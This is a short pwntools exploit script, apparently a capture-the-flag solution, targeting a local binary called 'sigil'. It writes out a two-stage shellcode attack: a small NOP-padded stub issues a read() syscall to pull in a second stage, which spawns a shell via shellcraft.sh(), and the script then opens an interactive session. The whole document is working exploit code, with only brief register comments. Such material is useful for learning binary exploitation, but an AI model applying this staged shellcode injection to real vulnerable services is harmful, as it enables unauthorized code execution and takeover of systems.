from pwn import *
context(arch='amd64')

HOST = '127.0.0.1'
PORT = 4444

r = process('./sigil')
# r = remote(HOST, PORT)

# Debug helper
"""
gdb.attach(r, '''
bp 40062a
c
''')
"""

"""
read() syscall
rax - 0
rdi - file descriptor to read from - 0 => stdin
rdi - destination buffer
rdx - length to read
"""

"""
rax is already 0 for syscall read
rdi is already 0
rdx is already a large number
'xor rdi, rdi', # Read from stdin (file descriptor 0)
"""
shellcode = asm('\n'.join([
'mov rsi, rdx', # rdx already contains our buffer location
'mov edx, 0x30',
'add rsi, 10',
'syscall'
]))

shellcode = shellcode.rjust(16, '\x90')

log.info("Shellcode:[{}]  {}".format(len(shellcode), shellcode))


log.info("Stage2: {}".format(shellcraft.sh()))
sc = asm(shellcraft.sh())
sc = sc.rjust(0x30, '\x90')
log.info("Stage2: {}".format(sc))

r.sendline(shellcode + sc)

r.interactive()
